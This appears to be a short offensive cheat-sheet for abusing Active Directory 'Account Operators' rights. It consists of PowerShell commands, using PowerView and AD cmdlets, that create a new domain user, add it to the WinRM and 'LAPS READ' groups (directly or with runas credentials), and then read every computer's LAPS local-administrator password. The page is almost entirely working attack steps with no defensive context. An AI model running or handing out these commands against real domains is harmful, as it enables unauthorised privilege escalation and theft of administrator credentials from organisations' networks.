---
title: "Account Operators"
date: 2024-7-23
tags: ["Account Operators", "active driectory", "ad", "Windows", "LAPS"]
---

---
### Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

### Create New User Account

#### Authenticated

```powershell
$password = "password"
```

```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```

```powershell
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```powershell
# Create new user
New-AdUser new_user -enabled $true -accountpassword $secstr
```

```powershell
# Grant new user privilege (e.g. WinRM)
Add-DomainGroupMember -Identity WinRM -Members 'new_user'
```

#### Runas

```powershell
$username = "domain\username"
```

```powershell
$password = "password"
```

```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```

```powershell
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

```powershell
# Create new user
New-AdUser new_user -credential $cred -enabled $true -accountpassword $secstr
```

```powershell
# Grant new user privilege (e.g. WinRM)
Add-DomainGroupMember -Identity WinRM -Credential $cred -Members 'new_user'
```

### Add New User to LAPS group

```powershell
Add-DomainGroupMember -Identity 'LAPS READ' -Credential $cred -Members 'new_user'
```

### Read the LAPS password 

```powershell
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

<br>